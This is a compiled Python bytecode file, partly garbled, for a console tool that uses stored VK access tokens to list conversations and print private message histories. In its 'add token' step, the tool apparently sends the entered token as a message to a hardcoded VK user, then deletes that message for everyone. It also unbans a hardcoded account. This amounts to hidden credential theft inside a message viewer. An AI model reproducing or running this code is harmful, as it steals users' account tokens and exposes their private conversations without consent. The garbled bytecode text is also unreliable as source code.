U
    C�p^�  �                   @   s�  d dl Z d dlZd dlZd dlmZ e�d� ee�dd��� �	� d �Z
edd�Ze��  ed	� dZd
ad
ad ag add� Zdd� Zdd� Zed�Zedk�r�ed�Zz�e jed�Ze jeddd�Zzejjdd� e� d� W n   dZ!Y nX ej"j#ded� ej"j$ddd�d d  d Z%ej"j&e%d d � e� d� edd!�Z'e'�(ed" � e'��  W n   ed#� Y nX ed$� e)�  n^ed%k�r�ed&� e)�  nDedd�Zed'�Z*e*d  d(k�s�e*d  d)k�r�dZnd Ze�  e�  dS )*�    N)�Thread�clearz	stty size�r�   z.tokensza+u^  [37m
 InvertedOnes                   Vk: @inverted_ones[32m
 ┏━━┳━━┳━━━━━┳━━━━━┳━━━━━┳━━━━━┳━━━━━┳━━━━━┳━━━━━┓
 ┃     ┃  ━━━┫  ━━━┫  ━━━┫  ━  ┃  ┏━━┫  ━━━┫  ━━━┫
 ┃ ┃ ┃ ┃  ━━━╋━━━  ┣━━━  ┃     ┃  ┗  ┃  ━━━╋━━━  ┃
 ┗━┻━┻━┻━━━━━┻━━━━━┻━━━━━┻━━┻━━┻━━━━━┻━━━━━┻━━━━━┛
[35m
[1] Show list
[2] Add token
Fc            !   
   C   s$  d} t �� }|d t|�d � }|dks,tr8t ��  q�qzttj|d�}tj|ddd�}|j�	� d }|d d	 |d
  }tr�W q�t
d| d t| � � t�|� | d7 } W q   t
d� Y qX qts�tdkr�d}q�ttd  }datj|d�}tj|ddd�}|j�� d }t|d �}g }	|	�|j�	� d d � d} t�d� t|d �D �]�}
t�rd �q$|jj|
d dd�d }|D �]�}|d }|d }|d }|d dk�r�|d }|jj	|d�d }|d |	d k�r�d}nd}|d d	 |d
  }nN|d dk�r d}|d }|d d  }n&d}t|d �}|jj|d!�d d" }t�rR �qRz�|d# }d}|dk�rrd$}d%}|t|�t 7 }|d& |	d k�r�d'| d	t|   d( }t
d)| | d* t| � d+ | � | d7 } |	�|d � W n(   t
d,| d t|� d( � Y nX t�d-� �q��qRt�s4tdk�r<d}�q$d.a|jj|	t d/�d }|d dk�rrt|d �}nt|d d �}t|�D �]�}t�r�t
d� t�  |jj|	t d|d td0�d }|D �]H}t�d1t�|d2 ��}|jj	|d& d�d }|d# }d}|dk�rd$}d3}d}|d d	 |d
  }|d |	d k�rnd	tt|�t  t|� d  d4 | d5 | }|�d)�}|dk�rLd6g}g }d}t|d �D ]T}|� d|�!d)|�� |d d6k�r�t|�|d< |� d|d | � |d d }�q�tt|�d �D ]B} || d  d }|d |� d	t||  t    ||d �  }�qnd	tt|�t  |  | }d}nd| d | }d7|k�r�d	| tt|d7 d# �d t   d8 |d7 d#  d9 | }t�r�t�d:� d;at
d)| d+ | � |d< g k�rt
|d< � t�d-� �qȐq�t
d� d S )=Nr   � �Zaccess_tokenz5.92�ru��vZlangr   Z
first_name� �	last_namez[33mz[37m z[31mInvalid token�pidor�count��   �idg�������?)�offsetr   �itemsZlast_messageZconversation�peer�type�user)Zuser_idsz[35mZchatz[36mZlocal_idZchat_settings�title)Zgroup_id�name�textu   [37mВложение[0m�����Zfrom_idz	[0m[44mz[0m�
z [37mz
[0mz
[31mg�������?T)�user_id)r   r   r   Zrevz%d %b %Y %H:%M:%S�date�	   z[37mz [33m�����Zreply_messagez[37m|z[0m
�   FZattachments)"�f�readline�len�stop�close�vk�Session�APIZusers�get�print�str�tokens�append�choice�messagesZgetConversations�int�time�sleep�range�abs�groupsZgetById�width�end�
getHistory�quit�
from_begin�strftime�	localtimer   �insert�find)!Znumb�new�session�apir   �you�tokenr   ZlapsZidsZlapr   �itemZmessZconvr   r   Zcolorr   ZfixZmg_countZmgZobjects�objectr   ZmyZusr_infoZentersZspacesZlengthsZ
last_enterZenterZspace� rE   �
dialogs.py�main   s�    



$" 

0

2
<
rG   c                  C   sT   t r<ts<td�aztt�atdkr&da W qN   d} Y qNX q t�  td� da q d S )Nz
[35mEnter the number: [0mr   Fr   z
[0m[F[FT)r#   r6   �inputr-   r/   r)   )rA   rE   rE   rF   �stop_it_now�   s    rI   c                  C   s8   t td�} t td�}| ��  |��  | ��  |��  d S )N)�target)r   rG   rI   �start�join)Zmain_threadZstop_threadrE   rE   rF   �threads�   s    

rM   z&Please, enter your task's number: [0m�2z[35mEnter the token: [0mr   z5.89r   r	   i�ϭ)Zowner_idg      �?r   )r   �message)r   r   r   r   )Zmessage_idsZdelete_for_all�ar   z
[31mInvalid tokenr   �1z
[31mInvalid task's number
z-[35mRead from the beginning? [37m(y/n) [0m�y�Y)+r%   �osr0   Z	threadingr   �systemr/   �popen�read�splitr5   �openr    r$   r)   r9   r#   r6   r-   r+   rG   rI   rM   rH   ZtaskZtkr&   r?   r'   r@   ZaccountZunbanr1   rA   r.   �sendr7   Zmg_id�delete�w�writer8   ZrftbrE   rE   rE   rF   �<module>   s^   

 	






